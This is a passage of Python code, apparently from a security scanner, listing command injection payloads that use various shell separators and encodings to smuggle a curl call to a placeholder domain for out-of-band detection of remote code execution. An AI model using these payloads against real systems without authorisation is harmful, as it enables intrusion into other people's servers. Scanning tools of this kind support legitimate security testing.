...
if not n_payloads:
    t_payloads = [
        '%0Acurl%20rce___RANDOM_STR__.__DOMAIN__',
        '%0Acurl%20rce___RANDOM_STR__.__DOMAIN__',
        '%0a%20curl%20rce___RANDOM_STR__.__DOMAIN__%20%0a',
        '%0Acurl%20rce___RANDOM_STR__.__DOMAIN__%0A',
        '|curl%20rce___RANDOM_STR__.__DOMAIN__',
        ';curl%20rce___RANDOM_STR__.__DOMAIN__',
        ';curl%20rce___RANDOM_STR__.__DOMAIN__|',
        ';curl%20rce___RANDOM_STR__.__DOMAIN__;',
        ';curl$IFSrce___RANDOM_STR__.__DOMAIN__;',
        ')|curl%20rce___RANDOM_STR__.__DOMAIN__',
        ')|curl%20rce___RANDOM_STR__.__DOMAIN__;',
        ');curl%20rce___RANDOM_STR__.__DOMAIN__',
        ');curl%20rce___RANDOM_STR__.__DOMAIN__|',
        ...
        '||curl%20rce___RANDOM_STR__.__DOMAIN__;',
        '||curl$IFSrce___RANDOM_STR__.__DOMAIN__;',
        '|%20curl%20rce___RANDOM_STR__.__DOMAIN__',
        '|curl%20rce___RANDOM_STR__.__DOMAIN__',
        '|curl%20rce___RANDOM_STR__.__DOMAIN__|',
        '|curl%20rce___RANDOM_STR__.__DOMAIN__;',
        ';|curl%20rce___RANDOM_STR__.__DOMAIN__|',
        ...
        '$(curl%20rce___RANDOM_STR__.__DOMAIN__)',
        '&%20curl%20rce___RANDOM_STR__.__DOMAIN__',
        '%26%20curl%20rce___RANDOM_STR__.__DOMAIN__%20%26',
        ';curl%20rce___RANDOM_STR__.__DOMAIN__\n',
        '\ncurl%20rce___RANDOM_STR__.__DOMAIN__|',
        '\ncurl%20rce___RANDOM_STR__.__DOMAIN__;',
        '|ncurl%20rce___RANDOM_STR__.__DOMAIN__\n',
        '\ncurl%20rce___RANDOM_STR__.__DOMAIN__\n',
        ';system(\'curl%20rce___RANDOM_STR__.__DOMAIN__\')',
        ';exec(\'curl%20rce___RANDOM_STR__.__DOMAIN__\')',
        '|curl%20rce___RANDOM_STR__.__DOMAIN__\n',
        '`curl%20rce___RANDOM_STR__.__DOMAIN__`',
        '%0acurl%20rce___RANDOM_STR__.__DOMAIN__%0a',
    ]
